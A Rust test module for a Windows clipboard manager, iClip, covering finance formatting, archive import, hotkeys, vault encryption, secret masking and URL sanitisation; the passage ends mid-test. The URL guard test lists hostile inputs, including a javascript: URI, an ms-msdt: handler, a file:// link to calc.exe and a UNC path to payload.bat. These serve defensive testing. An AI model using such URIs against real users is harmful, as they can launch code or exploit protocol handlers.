pub mod archive;
pub mod canvas_ui;
pub mod engines;
pub mod hotkey;
pub mod intelligence;
pub mod model;
pub mod security;
pub mod store;

#[cfg(test)]
mod tests {
    use crate::archive::{export_pinned_archive_data, merge_archive_data, ArchiveBackupError};
    use crate::engines::*;
    use crate::model::{ClipContentType, ClipItem, PinCategory};
    use crate::store::ClipboardStore;
    use image::{codecs::png::PngEncoder, ColorType, ImageEncoder, Rgba, RgbaImage};
    use std::fs;
    use std::time::Instant;

    #[test]
    fn test_rmb_uppercase_accounting_rules() {
        assert_eq!(
            to_chinese_uppercase_rmb("0", None).as_deref(),
            Some("零元整")
        );
        assert_eq!(
            to_chinese_uppercase_rmb("0", Some("05")).as_deref(),
            Some("伍分")
        );
        assert_eq!(
            to_chinese_uppercase_rmb("10", Some("05")).as_deref(),
            Some("壹拾元零伍分")
        );
        assert_eq!(
            to_chinese_uppercase_rmb("100000005", None).as_deref(),
            Some("壹亿零伍元整")
        );
        assert_eq!(
            to_chinese_uppercase_rmb("128560", Some("50")).as_deref(),
            Some("壹拾贰万捌仟伍佰陆拾元伍角整")
        );
        assert!(to_chinese_uppercase_rmb("1000000000000", Some("00")).is_none());
    }

    #[test]
    fn test_finance_guards_and_multiline_sum() {
        assert!(analyze_finance_numbers("13800138000").is_empty());
        assert!(analyze_finance_numbers("1763744800").is_empty());
        assert!(analyze_finance_numbers("2026").is_empty());

        let usd = analyze_finance_numbers("$1,280.50");
        assert!(!usd.iter().any(|a| a.id == "fin-rmb-upper"));
        assert_eq!(
            usd.iter()
                .find(|a| a.id == "fin-plain-num")
                .map(|a| a.result_text.as_str()),
            Some("1280.50")
        );

        let bill = "高铁差旅 ¥1,280.50\n酒店住宿 680\n市内打车 95.55元\n合计：99999";
        let bill_actions = analyze_finance_numbers(bill);
        let sum_only = bill_actions
            .iter()
            .find(|a| a.id == "bill-sum-only")
            .unwrap();
        assert_eq!(sum_only.result_text, "2056.05");
    }

    #[test]
    fn test_pdf_healing_and_pangu_url_protection() {
        let broken_en = "Modern transformer archi-\ntectures achieve state-of-the-\nart accuracy.\n\n1. First item\n2. Second item";
        let healed = heal_pdf_line_breaks(broken_en);
        assert!(healed.contains("architectures achieve state-of-the-art accuracy."));
        assert!(healed.contains("\n\n1. First item\n\n2. Second item"));

        let messy = "使用iClip在Windows11上提升300%效率，详见https://github.com/fanaruto/iClip仓库";
        let spaced = apply_pangu_spacing(messy);
        assert_eq!(
            spaced,
            "使用 iClip 在 Windows11 上提升 300% 效率，详见 https://github.com/fanaruto/iClip 仓库"
        );
    }

    #[test]
    fn test_table_bridge_and_windows_cf_html_exact_byte_offsets() {
        let md = "| **商品名称** | 单价 | 库存 |\n| :--- | ---: | :---: |\n| iClip Win | 0.00 | 999 |\n| 贴膜,高清 | 39.90 | 50 |";
        let actions = analyze_table_bridge(md);
        let excel = actions.iter().find(|a| a.id == "tbl-md-to-excel").unwrap();
        assert_eq!(
            excel.result_text,
            "商品名称\t单价\t库存\niClip Win\t0.00\t999\n贴膜,高清\t39.90\t50"
        );

        // 严苛验证微软 CF_HTML 字节偏移头：StartFragment..EndFragment 必须与实际 UTF-8 表格片段字节严丝合缝！
        let cf_html = excel.html_table_payload.as_ref().unwrap();
        let get_offset = |key: &str| -> usize {
            let line = cf_html.lines().find(|l| l.starts_with(key)).unwrap();
            line.split(':').nth(1).unwrap().trim().parse().unwrap()
        };
        let start_html = get_offset("StartHTML:");
        let end_html = get_offset("EndHTML:");
        let start_frag = get_offset("StartFragment:");
        let end_frag = get_offset("EndFragment:");

        let bytes = cf_html.as_bytes();
        assert_eq!(end_html, bytes.len());
        assert!(std::str::from_utf8(&bytes[start_html..end_html])
            .unwrap()
            .starts_with("<html>"));
        let frag_slice = std::str::from_utf8(&bytes[start_frag..end_frag]).unwrap();
        assert!(frag_slice.starts_with("<table"));
        assert!(frag_slice.ends_with("</table>"));
        assert!(frag_slice.contains("<th>商品名称</th>"));
    }

    #[test]
    fn test_image_studio_alpha_white_bg_and_mockup() {
        let mut img = RgbaImage::new(120, 90);
        for y in 0..90 {
            for x in 0..120 {
                if (30..90).contains(&x) && (20..70).contains(&y) {
                    img.put_pixel(x, y, Rgba([20, 100, 230, 255]));
                } else {
                    img.put_pixel(x, y, Rgba([0, 0, 0, 0]));
                }
            }
        }
        let mut png_bytes = Vec::new();
        PngEncoder::new(&mut png_bytes)
            .write_image(img.as_raw(), 120, 90, ColorType::Rgba8.into())
            .unwrap();

        let jpeg = compress_png_to_white_bg_jpeg(&png_bytes, 82).unwrap();
        let decoded_jpeg = image::load_from_memory(&jpeg).unwrap().to_rgb8();
        let corner = decoded_jpeg.get_pixel(2, 2);
        assert!(corner[0] > 245 && corner[1] > 245 && corner[2] > 245);

        let (mockup_png, mw, mh) = render_mockup_frame_png(&png_bytes, 24).unwrap();
        assert_eq!((mw, mh), (168, 138));
        assert!(mockup_png.len() > 200);
    }

    #[test]
    fn test_compliance_id_uscc_luhn() {
        let id17 = "11010519900307123";
        let chk = expected_id_card_checksum(id17).unwrap();
        let valid_id = format!("{id17}{chk}");
        let id_act = analyze_compliance_codes(&valid_id);
        assert!(id_act.iter().any(|a| a.id == "comp-id-group"));

        let uscc17 = "91440300192203821";
        let u_chk = expected_uscc_checksum(uscc17).unwrap();
        let valid_uscc = format!("{uscc17}{u_chk}");
        let typo_uscc = valid_uscc.replace("0300", "O3OO");
        let fix_act = analyze_compliance_codes(&typo_uscc);
        assert_eq!(fix_act[0].id, "comp-uscc-fix");
        assert_eq!(fix_act[0].result_text, valid_uscc);

        let base15 = "622202100111222";
        let valid_card = (0..=9)
            .map(|d| format!("{base15}{d}"))
            .find(|c| passes_luhn_check(c))
            .unwrap();
        let card_act = analyze_compliance_codes(&valid_card);
        assert!(card_act.iter().any(|a| a.id == "comp-card-group"));
    }

    #[test]
    fn test_otp_and_meeting_transcript() {
        let sms = "【招商银行】尾号8899账户于2026-11-22消费¥1280.50元，验证码为 654321，请在5分钟内输入。";
        assert_eq!(extract_verification_code(sms).as_deref(), Some("654321"));
        assert!(extract_verification_code("600519").is_none());

        let transcript = "张总监 00:01:12\n对齐合同排期\n张总监 00:01:19\n确认违约金上限。\n李律师 00:01:35\n建议控制在 20%。";
        let cleaned = clean_meeting_transcript(transcript).unwrap();
        assert_eq!(cleaned.removed_timestamps, 3);
        assert_eq!(
            cleaned.speaker_merged.as_deref(),
            Some("张总监：对齐合同排期，确认违约金上限。\n李律师：建议控制在 20%。")
        );

        let logs = "[10:12:01] [ERROR] Redis timeout pid=4821\n[10:12:05] [WARN] Retry";
        assert!(clean_meeting_transcript(logs).is_none());
    }

    #[test]
    fn test_cross_platform_macos_windows_archive_interoperability_and_otp_sweep() {
        let tmp =
            std::env::temp_dir().join(format!("iclip-win-test-{}", crate::model::now_unix_secs()));
        let img_dir = tmp.join("images");
        let _ = fs::create_dir_all(&img_dir);

        // 模拟一份由 macOS 版导出的真实 .iclip JSON 归档包，验证 Windows 版直接无缝解析合并
        let macos_exported_json = r#"{
            "appVersion": "2.0.0",
            "entries": [
                {
                    "contentHash": "text:mac-01",
                    "createdAt": "2026-11-22T02:30:00Z",
                    "customAlias": "Mac端同步过来的开票抬头",
                    "pinCategory": "invoice",
                    "sourceAppName": "备忘录",
                    "text": "公司名称：轻剪科技\n税号：91440300192203821K",
                    "type": "text"
                }
            ],
            "exportedAt": "2026-11-22T02:31:00Z",
            "exportedEdition": "flow",
            "format": "com.qingjian.iclip.archive",
            "schemaVersion": 1
        }"#;

        let mut store = ClipboardStore::new(tmp.clone());
        // 无固定项时导出应报 NoPinnedItems
        assert_eq!(
            export_pinned_archive_data(&store.items, &img_dir, "2.1.0", "dev"),
            Err(ArchiveBackupError::NoPinnedItems)
        );

        let (merged, summary) =
            merge_archive_data(macos_exported_json.as_bytes(), &store.items, &img_dir).unwrap();
        assert_eq!(summary.imported_new_count, 1);
        assert_eq!(
            merged[0].custom_alias.as_deref(),
            Some("Mac端同步过来的开票抬头")
        );
        assert_eq!(merged[0].pin_category, Some(PinCategory::Invoice));
        assert!(merged[0].is_pinned);

        // 验证 OTP 阅后即焚调度与到期自动无痕销毁
        let otp_item = ClipItem::new_text(
            "【GitHub】您的登录验证码：482910，5分钟内有效".to_string(),
            None,
        );
        let otp_id = store.insert_or_promote(otp_item);
        store.schedule_otp_expire_if_needed(&otp_id, 30);
        assert_eq!(store.items.len(), 1);
        // 未到期不删
        assert_eq!(
            store.sweep_expired_otps(crate::model::now_unix_secs() + 10),
            0
        );
        assert_eq!(store.items.len(), 1);
        // 到期后自动无痕销毁
        assert_eq!(
            store.sweep_expired_otps(crate::model::now_unix_secs() + 35),
            1
        );
        assert!(store.items.is_empty());

        let _ = fs::remove_dir_all(&tmp);
    }

    #[test]
    fn test_performance_benchmark_2mb_payload_under_5ms() {
        let huge_log =
            "2026-11-22T10:00:00Z service=gateway latency_ms=8 status=200\n".repeat(35_000);
        assert!(huge_log.len() > 2_000_000);
        let huge_item = ClipItem::new_text(huge_log, Some("Terminal".to_string()));

        let mut list = Vec::with_capacity(501);
        list.push(huge_item.clone());
        for i in 1..=500 {
            list.push(ClipItem::new_text(
                format!("订单 ORD-2026-{i} 金额 ¥{}.50", i * 100),
                Some("Excel".to_string()),
            ));
        }

        let t0 = Instant::now();
        for _ in 0..200 {
            let _ = huge_item.primary_title(false);
            let _ = huge_item.subtitle_info();
        }
        let hits: Vec<&ClipItem> = list
            .iter()
            .filter(|it| it.matches_query("ord-2026-499"))
            .collect();
        let elapsed = t0.elapsed();

        assert_eq!(hits.len(), 1);
        assert!(huge_item.subtitle_info().contains("MB"));
        assert!(
            elapsed.as_millis() < 15,
            "Windows 核心检索性能超标：{:?}",
            elapsed
        );
    }

    #[test]
    fn test_secret_redaction_and_url_cleaning() {
        let env_raw =
            "OPENAI_API_KEY=sk-proj-1234567890abcdefghijklmnop\nDB_PASSWORD=\"mySuperSecret88\"";
        let red = redact_secrets(env_raw);
        assert!(!red.contains("1234567890abcdefghijklmnop"));
        assert!(!red.contains("mySuperSecret88"));

        let dirty = "https://webfooo.com/post?id=7&utm_source=x&spm=a2.1#top";
        assert_eq!(
            clean_tracking_url(dirty).as_deref(),
            Some("https://webfooo.com/post?id=7#top")
        );
    }

    #[test]
    fn test_double_tap_modifier_state_machine_and_zero_false_trigger() {
        use crate::hotkey::{
            static_hotkey_conflict_reason, DoubleTapOutcome, WinHotKeyShortcut, WinHotKeySlot,
            WinModifierDoubleTapMachine, WinSingleModifier, MOD_CONTROL_BITS, MOD_SHIFT_BITS,
            MOD_WIN_BITS,
        };

        let mut fsm = WinModifierDoubleTapMachine::default();
        // 正常连按两次左 Ctrl (0xA2)：第二次松开瞬间触发
        assert_eq!(
            fsm.handle_modifier_transition(0xA2, true, MOD_CONTROL_BITS, 100),
            DoubleTapOutcome::None
        );
        assert_eq!(
            fsm.handle_modifier_transition(0xA2, false, 0, 180),
            DoubleTapOutcome::FirstTapCompleted(WinSingleModifier::Control)
        );
        assert_eq!(
            fsm.handle_modifier_transition(0xA2, true, MOD_CONTROL_BITS, 300),
            DoubleTapOutcome::None
        );
        assert_eq!(
            fsm.handle_modifier_transition(0xA2, false, 0, 360),
            DoubleTapOutcome::DoubleTapTriggered(WinSingleModifier::Control)
        );

        // 严防误触：快速 Ctrl+C -> Ctrl+V 夹杂普通键时绝不触发双击
        assert_eq!(
            fsm.handle_modifier_transition(0xA2, true, MOD_CONTROL_BITS, 1000),
            DoubleTapOutcome::None
        );
        fsm.mark_interfering_event(); // 按下了 C
        assert_eq!(
            fsm.handle_modifier_transition(0xA2, false, 0, 1080),
            DoubleTapOutcome::None
        );
        assert_eq!(
            fsm.handle_modifier_transition(0xA2, true, MOD_CONTROL_BITS, 1180),
            DoubleTapOutcome::None
        );
        fsm.mark_interfering_event(); // 按下了 V
        assert_eq!(
            fsm.handle_modifier_transition(0xA2, false, 0, 1250),
            DoubleTapOutcome::None
        );

        // 5 层快捷键冲突硬拦截校验
        let own = WinHotKeyShortcut::default_toggle();
        let queue_hk = WinHotKeyShortcut::default_queue_pop();
        let others = [(&queue_hk, "顺序出队热键")];

        // 1) 裸字符键拦截
        assert!(static_hotkey_conflict_reason(
            &WinHotKeyShortcut::combo(0x56, 0),
            WinHotKeySlot::MainToggle,
            &own,
            &others
        )
        .is_some());
        // 2) 单 Shift + 字母拦截
        assert!(static_hotkey_conflict_reason(
            &WinHotKeyShortcut::combo(0x41, MOD_SHIFT_BITS),
            WinHotKeySlot::MainToggle,
            &own,
            &others
        )
        .is_some());
        // 3) 系统保留键 Ctrl+C / Win+V 拦截
        assert!(static_hotkey_conflict_reason(
            &WinHotKeyShortcut::combo(0x43, MOD_CONTROL_BITS),
            WinHotKeySlot::MainToggle,
            &own,
            &others
        )
        .is_some());
        assert!(static_hotkey_conflict_reason(
            &WinHotKeyShortcut::combo(0x56, MOD_WIN_BITS),
            WinHotKeySlot::MainToggle,
            &own,
            &others
        )
        .is_some());
        // 4) iClip 内部槽位互斥拦截
        assert!(
            static_hotkey_conflict_reason(&queue_hk, WinHotKeySlot::MainToggle, &own, &others)
                .is_some()
        );
        // 5) 双击单键与合法组合键放行
        let dt_ctrl = WinHotKeyShortcut::double_tap(WinSingleModifier::Control);
        assert_eq!(dt_ctrl.display_string(), "双击 Ctrl");
        assert!(
            static_hotkey_conflict_reason(&dt_ctrl, WinHotKeySlot::MainToggle, &own, &others)
                .is_none()
        );
    }

    #[test]
    fn test_pinyin_synonym_url_decode_math_and_diff_intelligence() {
        use crate::intelligence::*;

        // 百分号中文 URL 可读解码与社媒口令剥壳
        let encoded = "https://zh.wikipedia.org/wiki/%E5%8F%91%E7%A5%A8%E6%8A%AC%E5%A4%B4";
        assert_eq!(
            decode_percent_readable_url(encoded),
            "https://zh.wikipedia.org/wiki/发票抬头"
        );
        let share_text = "68 【超实用效率神器推荐】复制打开小红书看看 https://www.xiaohongshu.com/explore/66a1b2?utm_source=copy_link，「真的绝了！」";
        assert_eq!(
            extract_clean_share_url(share_text).as_deref(),
            Some("https://www.xiaohongshu.com/explore/66a1b2")
        );

        // 拼音首字母盲搜 + 跨语言应用同义词 + `!排除词`
        let mut item = ClipItem::new_text(
            "公司名称：怀道科技\n纳税人识别号：91440300MA5F".to_string(),
            Some("WeChat".to_string()),
        );
        item.custom_alias = Some("深圳公司发票抬头".to_string());
        assert!(item.matches_query("fptt")); // 免切输入法搜拼音首字母
        assert!(item.matches_query("微信 怀道")); // 跨语言搜 WeChat
        assert!(!item.matches_query("怀道 !识别号")); // 排除词过滤

        // 刚复制金额免重敲百分比续算 + 大写人民币
        let math = evaluate_instant_math("* 13%", Some("¥10,000.00")).unwrap();
        assert!(math.used_clipboard_context);
        assert_eq!(math.plain_value, "1300");
        assert_eq!(math.rmb_uppercase.as_deref(), Some("壹仟叁佰元整"));

        // JSON 字典序语义对齐 Diff
        let j1 = r#"{"b":2,"a":1}"#;
        let j2 = "{\n  \"a\": 1,\n  \"b\": 2\n}";
        let same_diff = compute_clipboard_diff(j1, j2);
        assert_eq!(same_diff.added_count, 0);
        assert!(same_diff.json_semantically_equal);
    }

    #[test]
    fn test_store_backup_self_heal_undo_alias_autoprotect_and_suggestion() {
        let tmp = std::env::temp_dir().join(format!(
            "iclip-win-sync-test-{}-{}",
            crate::model::now_unix_secs(),
            std::process::id()
        ));
        let _ = fs::remove_dir_all(&tmp);
        {
            let mut store = ClipboardStore::new(tmp.clone());
            let id = store.insert_or_promote(ClipItem::new_text(
                "税号：91440300192203821K".to_string(),
                Some("Excel".to_string()),
            ));
            // 设置非空备注应自动开启收藏并推断为 Invoice（开票财务）分组
            let auto_pinned = store.set_custom_alias(&id, "总公司开票税号").unwrap();
            assert!(auto_pinned);
            assert!(store.items[0].is_pinned);
            assert_eq!(store.items[0].pin_category, Some(PinCategory::Invoice));

            // 模拟主 history.json 断电截断损坏，验证重启从 history.backup.json 自愈
            fs::write(tmp.join("history.json"), b"{corrupted_json").unwrap();
        }

        let mut healed = ClipboardStore::new(tmp.clone());
        assert_eq!(healed.items.len(), 1);
        assert_eq!(
            healed.items[0].custom_alias.as_deref(),
            Some("总公司开票税号")
        );

        // 验证误删后 8 秒内 Ctrl+Z 无损原位恢复
        let del_id = healed.items[0].id.clone();
        healed.delete_by_id(&del_id);
        assert!(healed.items.is_empty());
        assert_eq!(
            healed.undo_last_delete(crate::model::now_unix_secs()),
            Some(1)
        );
        assert_eq!(healed.items.len(), 1);

        // 验证 `@建议` 自然语言即时改配置并落盘
        let reply = healed.adopt_user_suggestion("开启始终在前，双击 Ctrl 呼出，保留 500 条");
        assert!(reply.contains("即时生效"));
        assert!(healed.config.always_on_top);
        assert_eq!(healed.config.hotkey_toggle.display_string(), "双击 Ctrl");
        assert_eq!(healed.config.max_history_count, 500);

        let _ = fs::remove_dir_all(&tmp);
    }

    #[test]
    fn test_canvas_sdf_primitives_zero_jitter_and_3col_grid_nav() {
        use crate::canvas_ui::*;
        use crate::store::GlassAppearance;

        // 零抖动高度铁律：卡片高度仅取决于固有属性，不随选中态跳变
        assert_eq!(standard_card_height(false, 1.0), 62);
        assert_eq!(standard_card_height(true, 1.0), 86);

        let items = vec![
            ClipItem::new_text("文本A".into(), None),
            ClipItem::new_image("1.png".into(), 100, 100, b"1", None),
            ClipItem::new_image("2.png".into(), 100, 100, b"2", None),
            ClipItem::new_image("3.png".into(), 100, 100, b"3", None),
            ClipItem::new_image("4.png".into(), 100, 100, b"4", None),
            ClipItem::new_text("文本B".into(), None),
        ];
        let indices: Vec<usize> = (0..items.len()).collect();
        let rows = build_display_rows(&indices, &items);
        assert_eq!(rows.len(), 4); // Card(0), ImageGrid(1,2,3), ImageGrid(4), Card(5)
        assert_eq!(grid_move_selection(&rows, 0, 6, GridMoveDir::Down), 1);
        assert_eq!(grid_move_selection(&rows, 1, 6, GridMoveDir::Right), 2);
        assert_eq!(grid_move_selection(&rows, 2, 6, GridMoveDir::Down), 4);
        assert_eq!(grid_move_selection(&rows, 4, 6, GridMoveDir::Down), 5);

        // 验证亚像素抗锯齿画布与全套矢量图标绘制（含越界裁剪安全性）
        let mut buf = vec![0u32; 420 * 560];
        let palette = GlassPalette::for_appearance(GlassAppearance::Tinted);
        let mut canvas = PixelCanvas::new(&mut buf, 420, 560);
        canvas.clear(palette.window_bg);
        canvas.fill_vgrad_round_rect(
            14,
            96,
            392,
            62,
            14.0,
            palette.select_top,
            palette.select_bottom,
        );
        canvas.stroke_round_rect(14, 96, 392, 62, 14.0, 1.0, palette.select_border);
        canvas.draw_icon_search(28.0, 30.0, 15.0, 1.7, palette.text_secondary);
        canvas.draw_icon_leaf(320.0, 30.0, 15.0, 1.7, palette.emerald);
        canvas.draw_icon_pin(356.0, 30.0, 15.0, 1.7, palette.cobalt, true);
        canvas.draw_icon_gear(392.0, 30.0, 15.0, 1.7, palette.text_primary);
        canvas.draw_icon_external_link(35.0, 127.0, 16.0, 1.8, Color4::rgb(255, 255, 255));
        canvas.draw_icon_star(360.0, 112.0, 14.0, 1.6, palette.amber, true);
        canvas.draw_icon_check_circle(
            26.0,
            127.0,
            18.0,
            1.65,
            palette.emerald,
            true,
            Color4::rgb(255, 255, 255),
        );
        canvas.draw_icon_trash(388.0, 112.0, 14.0, 1.6, palette.danger);
        canvas.draw_toggle_switch(350, 220, 38, 22, true, palette.cobalt);
        // 故意传入负坐标与超出右底边界坐标，确保 100% 安全裁剪零 panic
        canvas.fill_round_rect(-20, -20, 60, 60, 12.0, palette.cobalt);
        canvas.stroke_round_rect(390, 530, 60, 60, 12.0, 1.5, palette.amber);
    }

    #[test]
    fn test_todo_lifecycle_quick_capture_checklist_and_auto_archive() {
        use crate::intelligence::{extract_checklist_items, parse_quick_capture};
        use crate::model::ClipFilterTab;
        use crate::store::ClipboardStore;

        // 1. 闪念待办零歧义解析，且排除数学减法 `- 50` 与搜索词 `@todo`
        let t1 = parse_quick_capture("[] 下午核对 Q3 报表").expect("应识别 [] 待办");
        assert!(t1.default_todo && !t1.default_pin);
        assert_eq!(t1.body, "下午核对 Q3 报表");

        let t2 = parse_quick_capture("todo: 财务 :: 给王总发合同").expect("应识别带备注待办");
        assert!(t2.default_todo);
        assert_eq!(t2.alias.as_deref(), Some("财务"));
        assert_eq!(t2.body, "给王总发合同");

        let t3 = parse_quick_capture("- 修登录页圆角").expect("应识别短横线待办");
        assert!(t3.default_todo);
        assert_eq!(t3.body, "修登录页圆角");

        assert!(parse_quick_capture("- 50").is_none());
        assert!(parse_quick_capture("--help").is_none());
        assert!(parse_quick_capture("@todo").is_none());

        // 2. 多行清单提取（自动跳过已完成 `[x]` 项）
        let md = "- [ ] 修复圆角溢出\n- [x] 已上线官网\n- [ ] 补齐双端单测";
        let extracted = extract_checklist_items(md);
        assert_eq!(extracted, vec!["修复圆角溢出", "补齐双端单测"]);

        // 3. Store 待办排序（未完成在前、已完成沉底）、容量保护与 24h 自动归档
        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip_win_todo_test_{}",
            crate::model::now_unix_secs()
        ));
        let mut store = ClipboardStore::new(tmp_dir.clone());
        let id_a = store.capture_quick_todo("第一项待办", None).unwrap();
        let id_b = store.capture_quick_todo("第二项待办", None).unwrap();
        assert_eq!(store.pending_todo_count(), 2);

        // 勾选 id_b 为已完成 -> 在 Todo 分类中未完成的 id_a 应自动排在前面
        store.toggle_todo(&id_b);
        assert_eq!(store.pending_todo_count(), 1);
        assert_eq!(store.completed_todo_count(), 1);
        let todo_indices = store.filtered_indices(ClipFilterTab::Todo, "");
        assert_eq!(todo_indices.len(), 2);
        assert_eq!(store.items[todo_indices[0]].id, id_a);
        assert_eq!(store.items[todo_indices[1]].id, id_b);

        // 清空未收藏记录时，未完成待办 id_a 必须受保护保留
        store.clear_unpinned();
        assert!(store
            .items
            .iter()
            .any(|it| it.id == id_a && it.is_pending_todo()));

        // 重新添加已完成项并测试满 24h 自动归档
        let id_c = store.capture_quick_todo("已完成旧待办", None).unwrap();
        store.toggle_todo(&id_c);
        let done_ts = store
            .items
            .iter()
            .find(|it| it.id == id_c)
            .and_then(|it| it.todo_completed_unix_secs)
            .unwrap();
        assert_eq!(store.archive_expired_completed_todos(done_ts + 3600), 0);
        assert_eq!(store.archive_expired_completed_todos(done_ts + 86_401), 1);
        assert_eq!(store.completed_todo_count(), 0);

        // 待办添加备注说明不强制塞入收藏夹，且支持一键导出标准 Markdown 任务清单
        store.set_custom_alias(&id_a, "优先复盘");
        let item_a = store.items.iter().find(|it| it.id == id_a).unwrap();
        assert!(!item_a.is_pinned);
        let (md_out, md_cnt) = store
            .format_todos_as_markdown()
            .expect("应导出 Markdown 清单");
        assert_eq!(md_cnt, 1);
        assert_eq!(md_out, "- [ ] 优先复盘 — 第一项待办");

        let _ = std::fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_vault_encryption_tamper_heal_sensitive_veil_and_competitor_import() {
        use crate::archive::merge_archive_data_with_hint;
        use crate::security::{SensitiveSecretKind, VAULT_MAGIC};

        let tmp_dir = std::env::temp_dir().join(format!(
            "iclip_win_vault_test_{}",
            crate::model::now_unix_secs()
        ));
        let _ = fs::create_dir_all(&tmp_dir);

        // 1. 模拟历史遗留明文 history.json -> Store 启动后必须自动无损读取并升级为 ICLPWIN1 认证密文
        let secret_key = "sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz9876543210ZxY9";
        let plain_item = ClipItem::new_text(secret_key.to_string(), Some("Cursor".to_string()));
        let legacy_json = serde_json::to_vec(&vec![plain_item]).unwrap();
        let hist_path = tmp_dir.join("history.json");
        let bak_path = tmp_dir.join("history.backup.json");
        fs::write(&hist_path, &legacy_json).unwrap();

        let mut store = ClipboardStore::new(tmp_dir.clone());
        assert_eq!(store.items.len(), 1);
        assert_eq!(store.items[0].text.as_deref(), Some(secret_key));

        let on_disk = fs::read(&hist_path).unwrap();
        assert!(on_disk.starts_with(VAULT_MAGIC));
        assert!(!String::from_utf8_lossy(&on_disk).contains(secret_key));
        assert!(bak_path.exists());

        // 2. 恶意篡改主密文任意字节 -> HMAC-SHA256 鉴权拦截并自动从加密备份无损自愈
        let mut tampered = on_disk.clone();
        let last_idx = tampered.len() - 5;
        tampered[last_idx] ^= 0xAA;
        fs::write(&hist_path, &tampered).unwrap();

        let healed_store = ClipboardStore::new(tmp_dir.clone());
        assert_eq!(healed_store.items.len(), 1);
        assert_eq!(healed_store.items[0].text.as_deref(), Some(secret_key));

        // 3. 敏感凭据防肩窥圆点遮罩与粘贴即焚生命周期
        let item = &store.items[0];
        assert_eq!(
            item.detected_sensitive_kind(),
            Some(SensitiveSecretKind::ApiKey)
        );
        let veiled = item.display_title(false, true);
        assert!(veiled.contains("••••••••••••"));
        assert!(veiled.ends_with("ZxY9"));
        assert!(!veiled.contains("AbCdEfGhIjKl"));
        assert_eq!(item.display_title(false, false), secret_key);

        let item_id = store.items[0].id.clone();
        assert_eq!(store.toggle_burn_after_paste(&item_id), Some(true));
        assert!(store.schedule_burn_after_paste_if_needed(&item_id, 5));
        let now = crate::model::now_unix_secs();
        assert_eq!(store.sweep_expired_otps(now + 6), 1);
        assert!(store.items.is_empty());

        // 4. 跨软件一键无损搬家（Raycast JSON + Excel CSV 常用语表）
        let raycast = r#"[
            {"name": "总公司税号", "text": "上海怀道科技有限公司 91310115MA1K99882X", "keyword": "!sh"},
            {"name": "下载中心", "text": "https://app.webfooo.com/iClip", "keyword": "!dl"}
        ]"#
        .as_bytes();
        let (merged_ray, sum_ray) =
            merge_archive_data_with_hint(raycast, &[], &tmp_dir, Some("json")).unwrap();
        assert_eq!(sum_ray.source_format_label, "Raycast 常用语");
        assert_eq!(sum_ray.imported_new_count, 2);
        assert_eq!(merged_ray[0].pin_category, Some(PinCategory::Invoice));

        let csv = "标题,正文\n寄件地址,\"上海市浦东新区张江路, 100号\"\n欢迎语,您好！\n";
        let (merged_csv, sum_csv) =
            merge_archive_data_with_hint(csv.as_bytes(), &merged_ray, &tmp_dir, Some("csv"))
                .unwrap();
        assert_eq!(sum_csv.source_format_label, "CSV 常用语表");
        assert_eq!(sum_csv.imported_new_count, 2);
        assert_eq!(merged_csv.len(), 4);

        let _ = fs::remove_dir_all(tmp_dir);
    }

    #[test]
    fn test_red_team_subtitle_veil_url_guard_pii_and_ai_outbound() {
        use crate::security::{
            is_external_ai_or_chat_app, sanitize_safe_browser_url, seal_vault_bytes,
            SensitiveSecretKind,
        };
        use std::collections::HashSet;

        // 1. 高并发连续封装 Nonce 100% 无碰撞验证
        let key = [0x42u8; 32];
        let seed = std::path::Path::new("/tmp/iclip-nonce-test");
        let mut nonces = HashSet::new();
        for _ in 0..128 {
            let sealed = seal_vault_bytes(b"[{\"ok\":true}]", &key, seed);
            let mut nonce = [0u8; 16];
            nonce.copy_from_slice(&sealed[8..24]);
            assert!(nonces.insert(nonce), "CTR Nonce 绝不允许重复");
        }

        // 2. 备注名卡片副标题防泄密遮罩
        let secret_raw = "sk-proj-WinRedTeamSecretCheck9876543210AbCd";
        let mut aliased = ClipItem::new_text(secret_raw.to_string(), Some("Code".to_string()));
        aliased.custom_alias = Some("线上主密钥".to_string());
        assert_eq!(aliased.display_title(false, true), "线上主密钥");
        let veiled_sub = aliased.subtitle_info_veiled(true);
        assert!(veiled_sub.contains("••••••••••••"));
        assert!(!veiled_sub.contains("WinRedTeamSecretCheck"));
        assert!(aliased.subtitle_info_veiled(false).contains("sk-proj-"));

        // 3. 外部浏览器 URL 严格 http/https 白名单守卫
        assert_eq!(sanitize_safe_browser_url("javascript:alert(1)"), None);
        assert_eq!(
            sanitize_safe_browser_url("file:///C:/Windows/System32/calc.exe"),
            None
        );
        assert_eq!(sanitize_safe_browser_url("ms-msdt:id=PCWDiagnostic"), None);
        assert_eq!(sanitize_safe_browser_url("search-ms:query=password"), None);
        assert_eq!(
            sanitize_safe_browser_url(r"C:\Windows\System32\cmd.exe"),
            None
        );
        assert_eq!(
            sanitize_safe_browser_url(r"\\10.0.0.1\share\payload.bat"),
            None
        );
        assert_eq!(
            sanitize_safe_browser_url("localhost:3000/api"),
            Some("http://localhost:3000/api".to_string())
        );
        assert_eq!(
            sanitize_safe_browser_url("https://app.webfooo.com/iClip?utm_source=test"),
            Some("https://app.webfooo.com/iClip".to_string())
        );

        // 4. GB 11643 身份证与 Luhn 银行卡精准遮罩 + `@敏感`/`@即焚` 审计快筛 + 外发 AI 置顶脱敏
        let id_ok = ClipItem::new_text("法人身份证 110101199003077758".to_string(), None);
        assert_eq!(
            id_ok.detected_sensitive_kind(),
            Some(SensitiveSecretKind::PersonalIdentity)
        );
        assert!(id_ok.matches_query("@敏感"));

        let id_fake = ClipItem::new_text("运单流水 110101199003077759".to_string(), None);
        assert_eq!(id_fake.detected_sensitive_kind(), None);
        assert!(!id_fake.matches_query("@敏感"));

        let card_ok = ClipItem::new_text("收款卡 6222021234567894".to_string(), None);
        assert_eq!(
            card_ok.detected_sensitive_kind(),
            Some(SensitiveSecretKind::PersonalIdentity)
        );

        let mixed = "- 核对线上配置\n- 轮换密钥 sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz123456";
        let mixed_item = ClipItem::new_text(mixed.to_string(), Some("Code".to_string()));
        let tmp_store_dir = std::env::temp_dir().join("iclip_ai_rank_check");
        let store = ClipboardStore::new(tmp_store_dir.clone());
        let raw_acts = analyze_text_actions(mixed, false);
        assert!(raw_acts.len() >= 2);
        assert_eq!(raw_acts[0].id, "todo-split-checklist");

        assert!(is_external_ai_or_chat_app(Some("ChatGPT")));
        let ai_ranked = store.rank_actions_for_context(&mixed_item, Some("ChatGPT"), raw_acts);
        assert_eq!(ai_ranked[0].id, "redact-secrets");
        assert_eq!(ai_ranked[0].title, "防泄密脱敏");
